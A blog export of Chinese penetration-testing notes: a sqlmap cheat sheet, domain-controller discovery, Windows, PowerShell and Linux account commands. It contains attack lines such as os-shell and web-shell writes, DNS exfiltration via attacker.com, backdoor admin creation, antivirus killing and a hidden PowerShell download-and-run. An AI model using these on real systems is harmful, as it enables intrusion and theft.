登陆后才能访问的页面--user-agent="xxxxxxxxxx" # 指定ua头--random-agent --level=3 # 随机ua头字典: /usr/share/sqlmap/txt/user-agents.txt, win下：sqlmap/data/txt/user-agents.txt#--level&gt;=3 # 才会检查user-agent头是否存在sql注入#app/waf/IPS/IDS过滤异常的ua头，sqlmap会报错--host "aaaaaaa" --level=5 # host头--level=5 # 才会检查host头是否存在sql注入(一般不建议设置这么高)--referrer --level=3 # 检查referrer--level &gt;=3 # 才会检查referrer是否存在sql注入--headers="host:www.a.com\nUser-Agent:xps" # 额外的自定义的headers（\n是换行，注意大小写）--headers="X-Forwarded-For:* " --dbs --batch --method=GET/POST # 限定请求方法 基于http身份认证 三种身份认证类型： Basic Diagest NTLM1--auth-type Basic --auth-cred "user:pass" # --auth-type指定身份认证类型，后门是账号密码 基于客户端证书的身份认证 : 1234# 用的很少# 下面两种参数不知道是哪个了，使用的时候自己查一下--auth-cert --auth-file="ca.PEM" #含有私钥的PEM的证书文件 http(s)代理使用代理防止被封等123--proxy="http://127.0.0.1:8888" # 本地网络的话不需要代理设置--auth-cred "user:pass" # 如果需要身份认证--ignore-proxy # 忽略系统代理设置，通常用户扫描本地网络目标（用于对本地/内容目标进行扫描的时候） 超时1234--deplay="6" # 每次请求之间延迟时间， 单位:s--timeout="10" # 请求超时时间，浮点数，默认30s--retries="5" # 连接超时重试次数，默认3次--randomsize="id" # 长度、类型与原始值保持一致的前提下，指定每次请求随机取值 的参数name（对id随机取值,但长度与原始是一致的） 12345678910--scope # 过滤日志(burp的request日志--&gt;option,Logging,proxy,requests)内容， 通过正则筛选扫描对象；-l burp.log --scope="&#123;www&#125;?\.target\.&#123;com|net|org&#125;" --level=3--safe-url / --safe-freq # 检测和盲注阶段会产生大量失败请求，服务端可能因此销毁session。#因此：每发送 --safe-freq次注入请求之后，发送一次正常的请求--skip-urlencode # 跳过url编码(默认GET方法会对内容进行编码，某些编码人员不遵守编码规则没编码) --eval="import hashlib;hash=hashlib.md5(id).hexdigest()" # 每次请求之前执行的py代码 / 每次请求更改或者增加新的参数值（时间依赖。其他参数依赖）后面值是依赖前面值的-u "id=1?hash=c4ca423dj8caf5d" --eval ="import hashlib;hash=hashlib.md5(id).hexdigest()" # 比如后面参数是hash的，每次都把id编码 12345678#### &lt;font color=red&gt;3. Detection &lt;/font&gt;风险等级​```bash --level # 1-5级（默认1） payload文件xml：/usr/share/sqpmap/xml/payloads， win：sqlmap\data\xml\payloads --risk # 1-4级(默认1/无害), risk升高可能造成数据被篡改风险(update),2会增加事件的测试语句，3会增加OR语句的sql注入测试 --string / --not-string / --regexp / --code / --text-only / --titles # 页面比较，基于bool的注入监测，依据返回页面内容的百年华判断真假逻辑。但有些页面随着时间阈值变化，此时需要人为执行标识真假的字符串 4. Optimization 优化性能相关的参数1234567891011--predict-output # 预设输出。根据检测方法，比对返回值和统计表内容，不断缩小监测范围；版本名，用户名，密码，Provileges，role，db名，表名，列名；#与--threads不兼容；统计表 #进而精确定位是什么数据库和版本等， /usr/share/sqlmap/txt/common-outputs.txt--keep-alive # 使用长连接，性能好，与--proxy不兼容， 但是大量长连接会严重占用服务器资源--null-connection # 只获取相应页面大小值，而非内容； 【用于盲注判断 真假】，降低网络带宽消耗；与--text-only参数不兼容(基于页面内容比较判断 真假)--threads=10 # 最大并发线程，盲注时每个线程获取一个字符（7次请求），获取完成后线程结束；默认1，建议不要大于10（可能会影响站点性能）-o # 开启前三个性能参数（除了--threads） 指纹信息12# Figerprint-f / --figerprint / -b / --banner # dbms指纹信息； DBMS，操作系统，架构，补丁 ​ 5. Enumeration 枚举12345678910111213141516171819202122232425262728293031323334353637 --schema --batch --exclude-sysdbs # sschema:元数据(使用默认选项) -- batch:自动执行 --count -a # --all -b # --banner --current-user --current-db --hostname # 机器的主名 --is-dba --users # 列出所有用户 --passwords --privileges -U user_name # 查看用户的权限（不加-U就是查当前用户） --roles --dbs # 列出所有数据库 --tables --columns --schema # 列出information_schema信息 --schema --exclude-sysdbs # Dump数据： --dump # 获取表中的数据，包括列 --stop --dump-all exclude-sysdbs # 除了系统库,... -C # column -T glag_table -D dvwa -X -U # user --start 100 --stop 200 # 指定分段 --stop --sql-query "select * from users" # 后面加要执行的sql语句 --exclude-sysdbs # 除去系统库 --pivot-column=P... ## 指定库表的列-D dvwa -T users --columns# dump数据-D dvwa -T users --dump 暴力破解是基于字典的1234# mysql &lt;5.0没有information_schema库 ， mysql&gt;=5.0如果无权读取...# access 无权读物MSysyObjects库--common-tables--common-columns # (Access系统表无列信息) 文件系统123FILE SYSTEM:--file-read="/etc/passwd" # 读系统文件--file-write="shell.php" --file-dest"/temp/shell.php" # 写,前面是源文件，后门是要写入到的文件 UDF注入详细的去查资料吧123UDF injection: (User Design Function)--udf-inject, --shared-lib # 编译共享库创建并上传到DB Server，以此生成UDF实现高级注入。#Linux：share object, windows:DLL 操作系统123456OS:# mysql, postgresql: 上传共享库并生成 sys-exec(), sys_eval()两个UDF# MSsql： xp_cmdshell 存储过程(1.有就用，2.禁就启，3.没就建)--sql-shell--os-shell--os-cmd ​ 6. Miscelianeous: 123456789-z # 参数助记符, --answer="extending=N" # 让出现提示的选项都选Y或N--check-waf # 检测WAF/IPS/IDS--hpp # 绕过检测WAF/IPS/IDS的有效方法；尤其对ASP/IIS 和ASP.NET/IIS检查--identify # 彻底检查WAF/IPS/I-mobile # 模拟智能手机设备--purge-output # 清除output文件夹--smart # 当有大量检测目标的时候，只选择基于错误的检测结果--wizard # 向导方式 7. General12345678910111213-s # sqlite会话文件保存位置-t # 记录流量文件保存位置--charset=GBK # 强制字符编码--crawl=3 # 从起始位置爬站深度--csv-del=";" # dump数据默认存在于","分割的csv文件中，可以指定其他分隔符--dbms-cred # 指定数据库账号--flush-session # 清空session--force-ssl # 让sqlmap知道访问的是https的网站--fresh-queries # 忽略seeeion查询结果--hex -v 3 # dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原 --output-dir="/tmp"--parse-errors # 分析和显示数据库内建保存信息--save # 将命令保存成配置文件 8. Windows Registory win注册表12345# 前提是有权限--reg-read # 读取--reg-add # 添加--reg-del--reg-key, --reg-value, --reg-data, --reg-type='' #..键的值等于... ​ 9. injection注入1234567891011121314151617-p "id,referrer" 指定扫描参数（即存在注入的那个参数），使 --level失效--skip="name, user-agent" # 排除指定的扫描参数--dbms # 判断数据库类型--dbms="mysql" # 指定只用mysql的方法进行注入--os='' # 指定系统--invalid-bignum / --invalid-logical # bignum使用大数使参数值失效id=99999999； logical 使用布尔判断使取值失效 id=13 AND 18=19--no-cast # 榨取数据时，sqlmap将所有结果转换为str，并将空格替换NULL结果--no-escape # 关闭功能：（当payload中用单引号界定str时，sqlmap使用char()编码逃逸的方法替换str）--prefix # 前缀--suffix # 后缀 “...?id=1” -p id --prefix"')" --suffix "AND ('abc'='abc"--tamper="xxxxx, yyyyyy, zzzzzz" # 混淆脚本(可自定义脚本)，染过应用层过滤，ips，waf 位置:/usr/share/sqlmaptamper#伪静态注入(全是斜线，使用“*”符号来自定义注射位置) sqlmap -u "http://www.xxx.com/123/456*/789" -v 4 ​ 10. Techniques技术123456789101112131415#默认使用全部技术B: Boolean-based bindE: Error-basedU: Union auery-basedS: Stacked queries (文件系统，操作系统，注册表必须)T: Time-based-bind--time-sec # 基于时间的注入检测相应延迟时间（默认5s）--union-cols 6-9 # 默认联合查询1-10列，随--level增大最多支持50列 --union-char 123 # 联合查询默认使用NULL， 极端情况下NULL可能失败，此时可以手动执行数值 --dns-domain attacker.com # 攻击者控制了DNS服务器，使用此功能可以提高数据榨取速度--second-order http://1.1.1.1/a.php # 在一个页面注入的结果，在另一个页面体现出来 ​ 小例子获取指定数据库 指定表 指定列 1--batch -D &apos;dbname&apos; -T &apos;tablename&apos; -C &apos;username.password&apos; --dump 提权操作 12345678# 数据库提权--batch --sql-hell# 系统提权--batch --os-shell# 执行系统命令(前提要有权限)--os-cmd=ls / 把文件上传到数据库服务器中 1sqlmap.py --file-write --file-dest &quot;服务器路径&quot;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查找域控的几个常用方法]]></title>
    <url>%2F%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[查找域控的几个常用方法1.net view 1net view /domain 2.set log 1set log 3.通过srv记录 1nslookup -type=SRV _ldap._tcp.corp 4.使用nltest 1nltest /dclist:corp 5.使用dsquery 1DsQuery Server -domain corp 6.使用netdom 1netdom query pdc]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>域控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux找出最近或者今天被修改的文件]]></title>
    <url>%2FLinux%E6%89%BE%E5%87%BA%E6%9C%80%E8%BF%91%E6%88%96%E8%80%85%E4%BB%8A%E5%A4%A9%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[参考：http://www.hackdig.com/01/hack-42547.htm 0x01 列出某个目录下今天创建或者修改的文件1 显示目录home/ym下，今天创建或者修改的文件ls -al --time-style=+%D | grep &#39;date +%D&#39; 参数解释： 1234567-a - 列出所有文件，包括隐藏文件-l - 启用长列表格式--time-style=FORMAT - 显示指定 FORMAT 的时间+％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期-a - 列出所有文件，包括隐藏文件-l - 启用长列表格式--time-style=FORMAT - 显示指定 FORMAT 的时间+％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期 2 按字母顺序对结果排序显示ls -alX --time-style=+%D | grep &#39;date +%D&#39; 3 按文件大小从大到小对结果排序显示ls -alS --time-style=+%D | grep &#39;date +%D&#39; 0x02 列出某天所有被修改文件1 列出当前目录今天被修改的文件find . -maxdepth 1 -newermt &quot;2017-1-8&quot; find . -maxdepth 1 -newermt &quot;1/8/2017&quot; 2 列出系统中今天被修改的所有文件find . -newermt &quot;2017-1-8&quot; find . -newermt &quot;1/8/2017&quot; 0x03 查找被访问过的文件1 今天被访问的文件find /home -atime 0 #查看home 目录下今天被访问的文件 2 查看几天之内被访问的文件find . -atime +2 # -atime n, File was last accessed n*24 hours ago.；查看当前目录三天之内被访问的文件 0x04 查看被修改过的文件1 今天被访问的文件find /home -ctime 0 #查看home 目录下今天被修改过的文件 2 查看几天之内被访问的文件find . -ctime +2 # -ctime n, File was last changed n*24 hours ago.；查看当前目录三天之内被修改过的文件 0x05 更多查看文件的用法… …]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下面一些安全日志文件]]></title>
    <url>%2FLinux%E4%B8%8B%E9%9D%A2%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[123456789文件 /var/run/utmp 记录现在登入的用户文件 /var/log/wtmp 记录用户所有的登入和登出文件 /var/log/lastlog 记录每一个用户最后登入时间文件 /var/log/btmp 记录错误的登入尝试（注：可以查看电脑是否正在被爆破）文件 /var/log/auth.log 需要身份确认的操作(可能存在)]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows命令简记]]></title>
    <url>%2Fwindows%E5%91%BD%E4%BB%A4%E7%AE%80%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[1、windows系统基础命令123456789101112131415161718192021222324252627282930313233343536ipconfig /all 获取ip地址 linux：ifconfig -aRoute print 路由信息Arp -a arp缓存Netsh firewall show config 查看防火墙规则Netsh firewall show state Netstat -an 获取端口信息Whoami 当前用户权限Hostname 主机名称Set 环境变量Query user 查看远程终端在线用户Systeminfo 获取操作系统版本、类型、位数等相关信息、安装；-b： 显示包含于常见每个链接或监听端口的可执行组件；-o： 显示与每个连接相关的所属进程ID；-v： 与b一起使用时将显示包含于为所有可执行组件创建连接或者监听端口的组件；Netstat -anb 进程号、端口开放情况、开放端口程序、监听端口组件Netsata -ano tcp/udp协议信息、端口、进程号Netstat -anvb 进程号、端口所用协议、调用的可执行组件、第三方进程的系统路径等Net start 获取服务信息利用第三方漏洞提权、关闭杀毒软件、防火墙、以及关闭某些防护进程Net stop servicesname 停止服务命令Net start servicename 开启服务命令Tasklist /svc 获取运行的进程名称、服务、PID Driverquery 查看已安装驱动程序列表Net start 查看已经启动的windows服务Msinfo32 获取更加详细的信息Taskkill 是windows自带的终止进程程序TASKKILL [/S system [/U username [/P [password]]]]&#123; [/FI filter] [/PID processid | /IM imagename] &#125; [/T] [/F]#例如：taskkill /pid 452 /f taskkill /im 360tray /f#用户管理命令：Net user hack 123 /add 添加hack用户 密码为123Net localgroup adminnistrators hack /add 添加hack为管理员权限Net localgroup adminnistrators 查看当前系统管理员Net localgroup "remote desktop users" hack /add 加入远程桌面用户组Net user hack 查看指定用户的信息Net user guest /active:yes 激活guest用户Net user guest 123 2、windows系统开启远程桌面（mstsc/rdesktop）12345678910111213141516#XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（0：ON、1：OFF）：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f #Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016：（0：ON、1：OFF）：wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1#Winserver2008/2012/Win2k3/win7wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1 #Winserver2008/2012/wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1#XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（Metasploit）：meterpreter &gt; run getgui -e 3、查看远程端口通过注册表查看：12REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber 查询rdp端口号set /a port = query hex value 通过命令查看12Tasklist /svc |find "TermService"Netstat -ano |find "1980" 本文转载]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Windows命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PowerShell基础知识]]></title>
    <url>%2FPowerShell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[PowerShell技术概学 本文内容较琐碎，思路较混乱，仅当入门小小小基础吧 Powershell基础特点 可以面向对象 绑定.net 兼容性好 灵活 基本常识 在PowerShell下，类似 cmd命令 叫作cmdlet 命令规范：动词-名词 ， 不区分大小写 可以直接在cmd中运行powershell来打开 查看PowerShell版本123Get-Host或者$PSversionTable.PSVERSION ps1文件： 一个PowerShell脚本其实就是一个简单的文本文件 运行脚本1.完整路径2.当前路径:./test.ps1 基本命令1234567891011Get-Command ： 得到所有PowerShell命令Get-Process ： 获取所有进程Get-Help ： 显示有关 Windows PowerShell 命令和概念的信息Get-History ： 获取在当前会话中输入的命令的列表Get-Job ： 获取在当前会话中运行的 Windows PowerShell 后台作业dir –r 执行策略123456Get-ExecutionPolicy #查看当前策略- Restricted #脚本不能运行（默认）- RemoteSigned #本地创建的脚本可以运行，但从网上下载的脚本不能运行- AllSigned #仅当脚本由信任的发布者签名时才能运行- Unrestricted #允许所有的脚本运行 绕过本地权限执行脚本123powershell.exe -ExexutionPolicy ByPass -File xxx.ps1# -ExexutionPolicy ByPass 绕过执行安全策略 本地隐藏绕过权限执行脚本1234powershell.exe -ExexutionPolicy ByPass -WindowStyle Hidden -NoLogo -Nolnteractive -NoProfile -File xxx.ps1# -WindowStyle Hidden 隐藏窗口# -NoLogo 启动不显示版权标志的PowerShell 用IEX下载远程PS1脚本绕过权限执行脚本123456powershell.exe -ExexutionPolicy ByPass -WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString("xxx.ps1");[Parameters]# -NonI 非交互模式# -NoProfile / -NoP 不加载当前用户的配置文件# Noexit 执行后不退出Shell （这在使用键盘记录等脚本时非常重要） 可以直接在终端进行数字计算…..笑死 自定义Powershell控制台右键自己看着自己的习惯调整吧编辑选项： 快速编辑选项（操作快且方便） 标准编辑选项 Powershell快捷键与linux中相似12345alt+F7 #清除命令的历史记录PgUp PgDn #翻页的效果Esc #情况命令行（我还是喜欢 ^L）Home #移动到命令行最左端End #移动到命令行最右端 Powershell管道和重定向基于对象的 管道：12345678#找字符串ls | findstr "an"# 查看name列ls | Format-table name# 还可以sort等`get-process p* | stop-process` # 找到p...的进程，然后停止 重定向：1234# &gt;, &gt;&gt;#重定向到文件中ls | Format-table name &gt;&gt; test.txt Powershell数学运算直接在终端执行即可，无需多讲 进行存储单位换算： 运算/比较 1234#运算1gb/1mb*18kb# 比较1gb -gt 1mb 进制转换，比如十六进制：0xa Powershell执行外部命令打开应用1234567891011121314#直接打开notepad#或者带双引号&amp;&quot;notepad&quot;# 直接打开服务services.exe# 查看环境变量$env:path# 仅在当前终端设置环境变量（临时生效）$env$path=$env$path+&quot;路径&quot; Powershell命令集 一般是动词-名词结构 查看所有命令：Get-Command查看命令帮助: get-help查看命令历史：get-history Powershell别名使用1234567891011121314# 查看所有别名get-alias# 可以查看命令别名get-help 命令# 查看别名对应的真实的命令get-alias -name ls# 找出以remove开头的别名():get-alias | where &#123;$_.definition.startswitch("Remove")&#125;# 查询所有别名最多的，并排序get-alias |group-object definition |sort -descending Count 自定义别名12345678910111213141516171819# 临时定义（退出终端就不生效了）set-alias -name pad -value notepad`# 删除别名 del alias pad## 永久设置别名（写入Windows PowerShell profile文件）#1.查看此文件在计算机中的位置：$profile#2.一般该文件在没有创建前是不存在的，使用以下命令为当前用户创建profile命令并返回文件地址：New-Item -Type file -Force $profile#3.打开文件将一些内容写入文件，创建别名，比如;Set-Alias notepad++ "C:\Development Kit\Notepad++\notepad++.exe"# 导出别名export-alias demp.ps1# 导入别名import-alias -force demo.ps1 Powershell变量变量基础1234567891011121314151617#定义变量$name=&quot;hhh&quot;#打印 直接$name# Note: 大小写不敏感，所以特殊变量尽量用花括号$&#123;&quot;i am a boy&quot;&#125;=&quot;ggggg&quot;# 可以直接运算$n=(2+8*10)/2# 多个变量同时值$n1=$n2=1$m, $n=1, 2#调换变量值$n1, $n2=$n2, $n1 变量操作123456789101112131415161718192021222324252627# 查看变量是否存在 test-pathtest-path variable:$n1# 删除变量del variable:$n1remove-variable## powershell提供了五个专门管理变量的命令Clear-VariableGet-VariableNew-VariableRemove-VariableSet-Variable### 变量写保护（只读）#1.设置$server = '10.10.10.10'Set-Variable server -option Readonly#2.新建时New-Variable nu1 -Value 100 -Force -Option readonly#上面的变量不能更改，但是可以通过删除变量(del Variable:num -Force)，再重新创建变量更新变量内容。# 选项Constant，常量一旦声明，不可修改new-variable num -Value "strong" -Option constant 自动化变量1.用户信息：例如用户的根目录$home2.配置信息:例如powershell控制台的大小，颜色，背景等。3.运行时信息：例如一个函数由谁调用，一个脚本运行的目录等。 123456789101112131415# 比如：终端一打开就自动加载的变量# 用户根目录$home# 跟linux下基本一样$$ #包含会话所收到的最后一行中的最后一个令牌。$^ #包含会话所收到的最后一行中的第一个令牌。$? #上一个命令的返回值$_ #包含管道对象中的当前对象$pid #进程id$null$Host$LastExitCode #包含运行的最后一个基于 Windows 的程序的退出代码。 参考：这里 环境变量123456789101112131415161718192021222324#查看环境变量ls envls env:name#查看具体环境变量的值$env:windir# 新建用户环境变量(临时)$env:name="xxx"# 新建环境变量(长久)xxx# 在环境变量的PATH下添加一条内容$Env:path=$Env:Path+";C:\Go\bin" # .net方式只对用户变量生效[environment]::setenvironment("PATH","D:\","User")# .net获取值[environment]::getenvironment("PATH","User")# 删除环境变量del env:name#或remove-item env:name 在其他脚本中使用powershell123#比如bat@echo offpowershell "&amp;'c:\Users\test\e.psl'" Powershell条件判断条件操作符1234567891011121314151617-eq 等于-ne 不等与-gt 大于-lt 小于-le 小于等于-contains#布尔-not 取反-ant-or-xor# 比如：80 -eq 701gb -gt lmb(1,2,3) -contains 2 if语句写脚本编辑器ISE里面了12345678910111213$num=56if($num -gt 50 -and $num -lt 60)&#123; "大于50且小于60"&#125;elseif($num -eq 50)&#123; "等于50"&#125;else&#123; "小于50"&#125; switch语句12345678$num=45switch($num)&#123; &#123;($_ -lt 50) -and ($_ -gt 40)&#125; &#123;"小于50且大于40"&#125; 50 &#123;"等于50"&#125; &#123;$_ -gt 50&#125; &#123;"大于50"&#125;&#125; Powershell循环结构foreach语句123456789$arr=1..10foreach ($n in $arr)&#123; if($n -gt 5) &#123; $n &#125;&#125; 打印路径中大小大于多少的文件123456789$pat_val=dir D:\antSwordforeach ($file in $pat_val)&#123; if($file.length -gt 1kb) &#123; $file.name &#125;&#125; while语句while123456$num=15while($num -ge 10)&#123; $num $num --&#125; do … while(先运行一次)123456$num=15do&#123; $num $num --&#125;while($num -ge 10) continue与breakbreak123456789101112$num=1while($num -le 10)&#123; if($num -eq 4) &#123; break &#125;else &#123; $num &#125; $num++&#125; continue12345678910111213$num=1while($num -lt 10)&#123; if($num -eq 4) &#123; $num++ continue &#125;else &#123; $num $num++ &#125;&#125; for语句123456$num=0for($i=1; $i -le 100; $i++)&#123; $sum+=$i $sum&#125; switch实现循环1234567$num=1..10switch($num)&#123; &#123;($_ % 2) -eq 0&#125;&#123;"此数值是偶数：$_"&#125; &#123;($_ % 2) -ne 0&#125;&#123;"此数值是奇数：$_"&#125; default&#123;"num=$_"&#125;&#125; Powershell数组数组的创建1234567891011121314151617181920# 1.$arr=1,2,3,4# 2.$arr=1..5# 3.可以支持不同类型的值$arr=1,"hhh",(get-date)# 4.空数组$arr=@()# 5.有个逗号就行$arr=,1# 6. 命令执行结果的每一行作为一个数组元素$arr=ipconfig#判断是否为数组$arr -is [array] 访问数组12345678910$arr[0]$arr[-1]$arr[0..2] # 取出0,1,2$arr.Count # 元素个数$arr[($arr.Count)..0] # 倒序$arr+="haha" # 增加元素 Powershell函数自定义函数及调用123456function test&#123; ping www.xpshuai.cn.&#125;test # 调用 传参123456789function test($site)&#123; ping $site&#125;test www.xpshuai.cn # 调用# 多个参数test p1 p2 函数返回值1234567891011121314function add($n1, $n2)&#123; $c=$n1,$n2 $sum=$n1+$n2; $sum.gettype().fullname # 数据类型 if($sum.gettype().fullname -eq "System.Double") &#123; "c为数组，索引取值: $c[0]" return $n1,$n2,$sum,"double浮点数" &#125; return $n1,$n2,$sum&#125;add 1 2.5 # 调用 Powershell定义文本powershell中转义符是反引号1234567891011"hello先执行命令: $(Get-Date)""hello表达式: $(5*6)""单双引号hello, my name is '哈哈'""都用双引号，用反引号转义：hello, my name is `"哈哈`""# 换行符:`n 回车: `r"你好啊 `n 朋友 `n 我换行啦" Powershell实现用户交互read-host123$input=read-host "请输入用户名""您好，你输入从用户名为: $input" Powershell格式化字符串12345678910111213# 格式化之前$name="lili"$age=20$gender="girl""My name is $name, i am $age years old, and i am a $gender"# 格式化 -f$name="lili"$age=20$gender="girl""My name is &#123;0&#125;, i am &#123;1&#125; years old, and i am a &#123;2&#125;, &#123;3&#125;." -f $name,$age,$gender,$(3*6)#运算的话，尽量用小括号括起来 String对象方法对字符串的操作12345678910$str="D:\Desktop\Cobalt strike4\test\a.txt"$str.Split(".")[-1] # 以.点分割，然后取最后一位$str.endswith("ll") # 是否以ll结尾$str.Contains("txt") # 是否包含某个字符串$str.CompareTo("D:\Desktop\Cobalt strike4\test\a.txt") # 判断两个字符串是否相等$str.IndexOf("w") # 找出w的索引位置$str.Insert(3,"hhh") # 在索引3地方插入hhh$str.Replace("c","C") # 替换$str.Remove(0) # 删除 Powershell操作注册表1234567891011121314151617181920212223242526272829#切换到根键cd hkcu:cd ..exit# 切换到别的根键cd HKLM:# 获取get-ItemProperty# 设置set-ItemProperty# 移除remove-ItemProperty# 等等其他命令 描述Dir, Get-ChildItem 列出键的内容Cd, Set-Location 更改当前（键）目录HKCU:, HKLM: 预定义的两个重要注册表根目录虚拟驱动器Get-ItemProperty 读取键的值Set-ItemProperty 设置键的值New-ItemProperty 给键创建一个新值Clear-ItemProperty 删除键的值内容Remove-ItemProperty 删除键的值New-Item, md 创建一个新键Remove-Item, Del 删除一个键Test-Path 验证键是否存在 Powershell文件操作1234567891011121314# 新建目录 New-Item xxxx -type directory # 或者 md test# 新建文件 New-Item xxxx.txt -type File# 删除目录Remove-Item test# 显示文本内容Get-Content test.txt# 设置文本内容 Set-Content .\test.txt -Value "哈哈哈哈哈哈哈"# 追加内容Add-Content .\test.txt -Value "嘻嘻嘻嘻嘻嘻嘻嘻"# 清除内容 Clear-Content .\test.txt 常用的PowerShell攻击工具： PowerSploit NiShang Empire (基于PowerShell的远控木马) PowerCat (PowerShell版的NetCat) 其他技巧… …]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-账号管理]]></title>
    <url>%2Fubuntu%20server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[用户账号管理基础用户账号管理 为新员工创建账号 修改账号密码策略 禁用休假员工账号 删除离职员工账号(一般先禁用, 如果要删除, 注意提前把重要文件备份) 设置账号访问权限(只赋予其工作必需的权限) 每个人保管自己的密码 不要将密码泄露给任何人 保证密码复杂度 不要将密码写在纸条贴在限制器上 关于Linux账号管理基础知识Root账号 能做任何事情（甚至删除操作系统自身） 大部分Linux发行版安装时要求设置root账号密码 而Ubuntu默认禁用Root账号 可sudo或临时切换为root账号 可手动启用root账号 平时以普通员工账号管理计算机 在Ubuntu中执行sudo rm -rf /后，有提示 安装过程中创建管理员个人账号： 作为日常管理使用 创建账号12345678910111213141516171819202122232425262728# 本机用户账号存储文件: `/etc/passwd` # 冒号分隔：第二列是占位符(x来代替密码，此文件不存储密码,在shadow中)，第三四列（uid,组id）root的id是0，第五列是用户描述，第六列是主目录,最后一列是终端类型# 逗号分隔的部分：# 创建用户（useradd） 建议添加-m参数useradd user01 -m # 一般是这样使用多useradd user01 -m -d /home/user01 # -d自定义主目录位置，父目录必须是存在# 如果只是sudo useradd user01 #是没有用户家目录的，且该用户的终端为sh# 新添加的账号的uid是递增的（系统会自动创建一个和uid相同的组id组账号）# 参数：-d # 账号主目录（复制于/etc/skel）-m # 同时创建主目录（默认首次登录时创建主目录） 用户主目录内容拷贝自`/etc/skel`-c # 全名（描述,即/etc/passwd中第五列那个）-e # 账号过期（YYYY-MM-DD） -- 适合临时工作的人-N # 不创建同名组账号(gid会默认设置为100) useradd user01 -m -N-g # 指定主组（必须已经存在） useradd user01 -m -g sudo-G # 额外组# Note:账号名最长32个字符（不要以数字或其他特殊字符开头）# 给用户设置密码sudo passwd user02 账号数据库1./etc/passwd格式：用户名:密码占位符:UID:GID:全名(描述),房间号,公司电话,家庭电话,others:主目录:shell 2./etc/shadow存放密码等其他相关信息, 默认root才能查看与读写格式：用户名:密码:上次修改时间:密码最小使用期限:密码最长使用期:&#39;密码&#39;过期前几天提醒:密码过期几天后账号会被锁定:&#39;账号&#39;过期日(距离1970-01-01的天数):保留 密码位置为!、*的账号不能直接登陆系统(其他账号登录可切换为其账号) , !表示密码被锁定 上次修改时间：自从1970-01-01起的天数，如果为0表示用户下次登陆需要修改密码，空表示关闭密码过期功能(不会被锁定) 密码最长使用期限&lt;密码最小使用期 时候，用户无法更改密码(一般会设置密码有效期为90天) 密码过期几天后账号会被锁定： 账号过期用户不能登录 密码过期看是否锁定账号 账户修改：建议多登陆几个会话备用，防止手滑出现问题导致登不上去 设置账号密码1234567891011121314passwd user01# 参数：-l # 锁定账户密码 sudo passwd -l user01-u # 解锁账号 sudo passwd -u user01-d # 删除密码（账号无密码可登录）-n/-x # 密码最小 / 最大 使用期限-w # 密码过期前几天发警告-i # 密码过期后锁账号-e # 密码立刻过期（下次登录必须修改密码）-s # 查看账号的密码状态(L 锁定, P有密码,NP没密码 ) passwd -aS# 查看账号密码状态（同上）passwd -a -S 添加账号adduser 参数少，更简洁123456789adduser user02# 基于useradd的perl脚本# 并非所有Linux发行版中都包含# 向导方式运行（不需记忆命令参数）# 位置： /usr/sbin/adduser# 另一个批量添加账号 newuserssudo newusers users.txt # 文件内容按passwd格式填写: user05:pass15:::hahaha:/home/user15:/bin/bash 删除账号userdel或deluser123456sudo userdel user02 # 不会删除主目录userdel -r user02 # 删除账号同时删除主目录（一般先禁用几个月等到不需要一下文件时候再删除但是要提前备份）userdel -f user02 # 强制删除文件rm -rf /home/user02 # 删除用户主目录 切换账号123456789# 切换到root账号su # 需要输入root密码（默认root没密码,先给root设密码[sudo passwd root]再操作）sudo su # 输入当前账号密码(是输入的当前账号的密码)sudo -i # 同上（root前面的命令提示符是井号） exit退出到自己的回话sudo -s # 同上# 切换到其他账号su user01 # 切换到其他账号（输入的user01的密码）sudo su user01 #切换到其他账号（输入的是当前用户的密码） 组账号管理 分组归类统一管理 将用户账号分组管理和指派权限 用户创建同时生成同名的组账号 每个文件有唯一的所属账号和所属组（属主、数组） 每个用户可以同属属于多个组，但只有一个主组 查看当前用户所属的组： groups cat /etc/groups格式： 